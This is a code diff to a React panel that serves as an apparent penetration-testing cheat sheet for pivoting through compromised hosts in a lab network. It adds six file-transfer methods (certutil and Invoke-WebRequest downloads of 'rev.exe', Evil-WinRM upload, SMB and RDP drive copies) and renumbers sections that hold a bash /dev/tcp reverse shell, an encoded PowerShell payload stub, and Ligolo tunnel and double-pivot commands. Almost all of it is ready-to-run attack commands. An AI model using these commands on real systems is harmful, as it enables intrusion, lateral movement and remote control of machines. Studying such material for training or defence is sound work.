@@ -1817,14 +1817,23 @@ function PivotingPanel() {
       { id:"pv16", text:"List active listeners", cmd:"listener_list" },
       { id:"pv17", text:"Remove a listener", cmd:"listener_stop LISTENER_ID" },
     ]},
-    { title: "5️⃣ REVERSE SHELL THROUGH PIVOT", scenario: "Need a shell callback from a machine behind the pivot? Use a Ligolo listener to catch reverse shells through the tunnel.", items: [
+    { title: "5️⃣ FILE TRANSFERS THROUGH PIVOT", scenario: "MS02 can't reach Kali directly. Stage files on MS01 or use Ligolo listeners to relay. MS02 sees MS01 as the source for everything.", items: [
+      { id:"pvt1", text:"METHOD 1: Ligolo listener relay — serve from Kali HTTP, MS02 downloads via MS01", cmd:"# Kali: python3 -m http.server 8000\n# Ligolo (MS01 session): listener_add --addr 0.0.0.0:8000 --to 0.0.0.0:8000\n# MS02: certutil -urlcache -f http://MS01_IP:8000/file.exe C:\\temp\\file.exe" },
+      { id:"pvt2", text:"METHOD 2: Evil-WinRM upload — if you have WinRM to MS02 through tunnel", cmd:"evil-winrm -i MS02_IP -u user -p pass\n*Evil-WinRM* > upload /home/kali/Windows/ligolo-agent.exe C:\\temp\\ligolo-agent.exe" },
+      { id:"pvt3", text:"METHOD 3: Host HTTP server on MS01 directly — serve files already staged on MS01", cmd:"# On MS01 (PowerShell):\npython3 -m http.server 8888\n# On MS02:\ncertutil -urlcache -f http://MS01_IP:8888/file.exe C:\\temp\\file.exe" },
+      { id:"pvt4", text:"METHOD 4: SMB from MS01 → MS02 (admin creds or same domain user)", cmd:"# From MS02: copy \\\\MS01_IP\\C$\\temp\\ligolo-agent.exe C:\\temp\\\n# Or net use \\\\MS01_IP\\C$ /user:DOMAIN\\user pass" },
+      { id:"pvt5", text:"METHOD 5: RDP shared drive — mount Kali tools folder via RDP to MS02", cmd:"xfreerdp /v:MS02_IP /u:user /p:pass /drive:tools,/home/kali/Windows /cert-ignore\n# On MS02: copy \\\\tsclient\\tools\\ligolo-agent.exe C:\\temp\\" },
+      { id:"pvt6", text:"METHOD 6: PowerShell download on MS02 via Ligolo relay", cmd:"# (After listener_add on MS01 session relays port 8000)\nInvoke-WebRequest http://MS01_IP:8000/rev.exe -OutFile C:\\temp\\rev.exe" },
+      { id:"pvt7", text:"⚠️ REMEMBER: MS02 points downloads at MS01_INTERNAL_IP, not Kali. Ligolo listener on MS01 relays back to Kali if needed." },
+    ]},
+    { title: "6️⃣ REVERSE SHELL THROUGH PIVOT", scenario: "Need a shell callback from a machine behind the pivot? Use a Ligolo listener to catch reverse shells through the tunnel.", items: [
       { id:"pv18", text:"Add listener to catch reverse shells — target sends to pivot host, Ligolo forwards to Kali", cmd:"listener_add --addr 0.0.0.0:443 --to 0.0.0.0:443 --tcp" },
       { id:"pv19", text:"Start nc listener on Kali to receive the shell", cmd:"rlwrap nc -lvnp 443" },
       { id:"pv20", text:"On internal target — point reverse shell at the FOOTHOLD machine IP (not Kali)", cmd:"bash -c 'bash -i >& /dev/tcp/FOOTHOLD_INTERNAL_IP/443 0>&1'" },
       { id:"pv21", text:"Windows variant — point at foothold's internal IP", cmd:"powershell -e JABjAGwAaQ...  # LHOST=FOOTHOLD_INTERNAL_IP LPORT=443" },
     ]},
-    { title: "6️⃣ DOUBLE PIVOT (SECOND HOP)", scenario: "Need to reach a THIRD network through a second compromised host? Upload agent to the second host and add another route.", items: [
-      { id:"pv22", text:"Upload agent to second-hop machine through existing tunnel", cmd:"# Transfer ligolo-agent to the second pivot host via the tunnel" },
+    { title: "7️⃣ DOUBLE PIVOT (SECOND HOP)", scenario: "Need to reach a THIRD network through a second compromised host? Upload agent to the second host and add another route.", items: [
+      { id:"pv22", text:"Upload agent to second-hop machine — use methods from section 5 (Ligolo listener relay, evil-winrm upload, SMB, or RDP shared drive)", cmd:"# See section 5 above. Fastest: evil-winrm upload or Ligolo listener relay from Kali" },
       { id:"pv23", text:"Run agent on second hop — connects back through the tunnel to Kali proxy", cmd:"./ligolo-agent -connect KALI_IP:11601 -ignore-cert" },
       { id:"pv24", text:"In Ligolo proxy — switch to new session", cmd:"session" },
       { id:"pv25", text:"Add route for the deeper subnet", cmd:"sudo ip route add 172.16.200.0/24 dev ligolo" },
